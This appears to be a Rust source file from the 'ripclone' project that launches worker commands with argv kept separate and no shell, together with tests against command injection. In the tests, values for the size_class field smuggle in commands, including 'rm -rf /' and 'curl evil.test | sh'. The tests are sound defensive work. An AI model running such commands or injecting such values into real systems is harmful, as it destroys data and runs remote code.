//! `exec` self-host escape hatch: run a configured command with the env bag.
//!
//! SAFETY: `size_class` (and any attacker-influenced name) is passed as a
//! **separate argv element** via [`std::process::Command::arg`]. Never
//! interpolated into a shell string — repo/branch/size names are untrusted.

use super::{ComputeProvider, WorkerSpec};
use anyhow::{Context, Result, bail};
use async_trait::async_trait;
use std::ffi::OsString;
use std::path::PathBuf;
use std::process::Stdio;
use tracing::info;

/// Configuration for [`ExecProvider`].
#[derive(Debug, Clone)]
pub struct ExecProviderConfig {
    /// Absolute or PATH-resolved program. **Not** a shell string.
    pub program: PathBuf,
    /// Fixed leading argv elements (no shell). `size_class` is appended after these.
    pub fixed_args: Vec<OsString>,
}

/// Runs `program [fixed_args…] size_class` with `spec.env` as the process env
/// (merged over the current environment so PATH etc. still resolve).
pub struct ExecProvider {
    program: PathBuf,
    fixed_args: Vec<OsString>,
}

impl ExecProvider {
    pub fn new(cfg: ExecProviderConfig) -> Self {
        Self {
            program: cfg.program,
            fixed_args: cfg.fixed_args,
        }
    }

    /// `RIPCLONE_DISPATCH_CMD` = program path. Optional `RIPCLONE_DISPATCH_CMD_ARGS`
    /// is a whitespace-split list of **fixed** leading args (not size/repo/branch).
    pub fn from_env() -> Result<Self> {
        let program = std::env::var("RIPCLONE_DISPATCH_CMD")
            .context("RIPCLONE_DISPATCH_CMD is required for RIPCLONE_DISPATCH=exec")?;
        if program.is_empty() {
            bail!("RIPCLONE_DISPATCH_CMD must not be empty");
        }
        let fixed_args = match std::env::var("RIPCLONE_DISPATCH_CMD_ARGS") {
            Ok(s) if !s.is_empty() => s.split_whitespace().map(OsString::from).collect(),
            _ => Vec::new(),
        };
        Ok(Self::new(ExecProviderConfig {
            program: PathBuf::from(program),
            fixed_args,
        }))
    }

    /// Build the argv that would be executed (for tests / inspection).
    ///
    /// Order: `[program, …fixed_args, size_class]`.
    pub fn argv_for(&self, size_class: &str) -> Vec<OsString> {
        let mut argv = Vec::with_capacity(2 + self.fixed_args.len());
        argv.push(self.program.as_os_str().to_os_string());
        argv.extend(self.fixed_args.iter().cloned());
        argv.push(OsString::from(size_class));
        argv
    }
}

#[async_trait]
impl ComputeProvider for ExecProvider {
    fn name(&self) -> &str {
        "exec"
    }

    async fn ensure_worker(&self, spec: &WorkerSpec) -> Result<()> {
        let program = self.program.clone();
        let fixed_args = self.fixed_args.clone();
        let size_class = spec.size_class.clone();
        let env = spec.env.clone();

        // Spawn off the async runtime: std::process::Command is sync.
        tokio::task::spawn_blocking(move || {
            let mut cmd = std::process::Command::new(&program);
            // Separate argv — never `sh -c` with interpolated size_class.
            for a in &fixed_args {
                cmd.arg(a);
            }
            cmd.arg(&size_class);
            // Overlay the worker env bag; do not replace the full environment so
            // PATH/HOME remain available for the helper script.
            for (k, v) in &env {
                cmd.env(k, v);
            }
            cmd.stdin(Stdio::null())
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());

            info!(
                program = %program.display(),
                size_class = %size_class,
                "exec.ensure_worker spawning"
            );

            let output = cmd
                .output()
                .with_context(|| format!("spawn {}", program.display()))?;
            if !output.status.success() {
                let stderr = String::from_utf8_lossy(&output.stderr);
                let stdout = String::from_utf8_lossy(&output.stdout);
                bail!(
                    "exec provider command failed (status={}): stderr={stderr} stdout={stdout}",
                    output.status
                );
            }
            Ok(())
        })
        .await
        .context("exec provider join")?
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::BTreeMap;
    use std::io::Write;

    fn write_recorder(dir: &std::path::Path) -> PathBuf {
        // Records argv as JSON lines of each arg, so we can assert no shell split.
        let path = dir.join("record_argv.sh");
        let mut f = std::fs::File::create(&path).unwrap();
        writeln!(
            f,
            r#"#!/bin/sh
# Recorder: write each argv element on its own line (length-prefixed safe-ish).
out="$1"
shift
: > "$out"
for a in "$@"; do
  printf '%s\n' "$a" >> "$out"
done
# Also dump a few env keys if present.
env_out="${{out}}.env"
: > "$env_out"
for k in RIPCLONE_QUEUE RIPCLONE_TOKEN; do
  eval "v=\$$k"
  if [ -n "$v" ]; then
    printf '%s=%s\n' "$k" "$v" >> "$env_out"
  fi
done
"#
        )
        .unwrap();
        // Make executable.
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(&path).unwrap().permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(&path, perms).unwrap();
        }
        path
    }

    #[test]
    fn argv_for_keeps_size_class_as_single_element() {
        let p = ExecProvider::new(ExecProviderConfig {
            program: PathBuf::from("/usr/bin/true"),
            fixed_args: vec![OsString::from("--lane")],
        });
        // Attacker-ish size class with shell metacharacters.
        let nasty = "small; rm -rf / && echo pwned";
        let argv = p.argv_for(nasty);
        assert_eq!(argv.len(), 3);
        assert_eq!(argv[0], OsString::from("/usr/bin/true"));
        assert_eq!(argv[1], OsString::from("--lane"));
        assert_eq!(argv[2], OsString::from(nasty));
        // Must not be a single shell string.
        let joined = argv
            .iter()
            .map(|a| a.to_string_lossy())
            .collect::<Vec<_>>()
            .join(" ");
        assert!(joined.contains(nasty));
    }

    #[tokio::test]
    async fn passes_size_class_as_separate_argv_no_shell_interpolation() {
        let dir = tempfile::tempdir().unwrap();
        let recorder = write_recorder(dir.path());
        let out = dir.path().join("argv.txt");

        let provider = ExecProvider::new(ExecProviderConfig {
            program: recorder,
            // First fixed arg is the output file path (consumed by the script).
            fixed_args: vec![OsString::from(out.as_os_str())],
        });

        let nasty = "large; curl evil.test | sh";
        let mut env = BTreeMap::new();
        env.insert("RIPCLONE_QUEUE".into(), "libsql".into());
        env.insert("RIPCLONE_TOKEN".into(), "secret-token".into());

        provider
            .ensure_worker(&WorkerSpec::new(nasty, env))
            .await
            .unwrap();

        let recorded = std::fs::read_to_string(&out).unwrap();
        let lines: Vec<&str> = recorded.lines().collect();
        // Script argv after the out path: only size_class (one element).
        assert_eq!(
            lines,
            vec![nasty],
            "size_class must be a single argv element, not shell-split; got {lines:?}"
        );

        let env_recorded = std::fs::read_to_string(out.with_extension("txt.env")).unwrap();
        assert!(env_recorded.contains("RIPCLONE_QUEUE=libsql"));
        assert!(env_recorded.contains("RIPCLONE_TOKEN=secret-token"));
    }

    #[tokio::test]
    async fn command_failure_surfaces_as_error() {
        let dir = tempfile::tempdir().unwrap();
        let fail = dir.path().join("fail.sh");
        std::fs::write(&fail, "#!/bin/sh\nexit 1\n").unwrap();
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(&fail).unwrap().permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(&fail, perms).unwrap();
        }
        let provider = ExecProvider::new(ExecProviderConfig {
            program: fail,
            fixed_args: vec![],
        });
        let err = provider
            .ensure_worker(&WorkerSpec::new("small", BTreeMap::new()))
            .await
            .unwrap_err();
        assert!(
            err.to_string().contains("exec provider command failed"),
            "got: {err}"
        );
    }
}
